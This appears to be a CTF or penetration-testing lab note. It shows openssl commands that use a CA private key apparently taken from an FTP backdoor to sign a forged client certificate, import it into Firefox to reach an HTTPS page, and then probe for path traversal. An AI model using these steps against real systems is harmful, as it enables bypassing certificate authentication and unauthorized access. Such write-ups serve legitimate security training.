## Working to get the 443 working with cert we get on ftp backdoor

Download the cert of the site , save as ca.pem
![[Pasted image 20211201054135.png]]

FTP key and the web key are the same key (trust)

![[Pasted image 20211201054431.png]]
Md5sum
```bash
$ openssl x509 -in ca.pem -pubkey -noout | md5sum; \
> openssl pkey -in ca.key -pubout | md5sum
71e2b2ca7b610c24d132e3e4c06daf0c  -
71e2b2ca7b610c24d132e3e4c06daf0c  
```

## Generate a client key
```bah
$ openssl genrsa -out client.key 4096
```

### Create Sign Request
```bash
$ openssl req -new -key client.key -out client.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:NY
Locality Name (eg, city) []:NYC
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Eris
Organizational Unit Name (eg, section) []:Black Eris
Common Name (e.g. server FQDN or YOUR name) []:dix
Email Address []:dix@dix.eris

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []
```

### Sign the Certificate
```bash
$ openssl x509 -req -in client.csr -CA ca.pem -CAkey ca.key -set_serial 9001 -extensions client -days 9002 -outform PEM -out client.cer
Signature ok
subject=C = US, ST = NY, L = NYC, O = Eris, OU = Black Eris, CN = dix, emailAddress = dix@dix.eris
Getting CA Private Ke
```

### Firefox can't import this extension, has to be pkcs12
```bash
$ openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
Enter Export Password:
Verifying - Enter Export Password:
```

### import the p12 certificate to firefox
![[Pasted image 20211201071546.png]]

![[Pasted image 20211201071612.png]]


### Now have acess to the https page
![[Pasted image 20211201071631.png]]

### Trying Path Traversal by editing the PATH variable
![[Pasted image 20211201072814.png]]

* Vulnerable to PATH Traversal
![[Pasted image 20211201072845.png]]